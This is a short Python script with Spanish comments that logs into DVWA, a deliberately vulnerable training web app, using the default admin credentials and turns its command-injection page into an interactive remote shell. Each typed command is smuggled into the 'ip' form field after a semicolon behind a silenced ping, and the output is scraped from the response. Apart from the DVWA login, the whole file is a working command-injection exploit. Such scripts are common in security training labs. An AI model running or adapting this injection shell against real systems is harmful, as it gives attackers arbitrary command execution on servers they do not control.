from utils import COMMAND_INJECTION_URL, generar_session
import requests
import re


# Credenciales de DVWA
username = 'admin'
password = 'password'

def consola_por_command_injection(session: requests.Session) -> None:
    ping_sin_salida='-c1 127.0.0.1 > /dev/null'
    print("¡Consola interactiva!")
    try:
        while (command:=input(">")):
            comando_formateado=f'{command}'
            form = {
                'ip': f'{ping_sin_salida};{comando_formateado}',
                'Submit': 'Submit'
            }
            res = session.post(COMMAND_INJECTION_URL, data=form)
            match = re.search('<pre>(.*)</pre>', res.text, flags=re.DOTALL)
            if match:
                resultado_comando = match.group(1)
                print(resultado_comando)
            else:
                print("Error o el comando no fue ejecutado correctamente.")
    except KeyboardInterrupt:
        print("\nSaliendo...")
        exit(0)
         
# Iniciar sesión en DVWA
session = generar_session(username, password)
consola_por_command_injection(session)


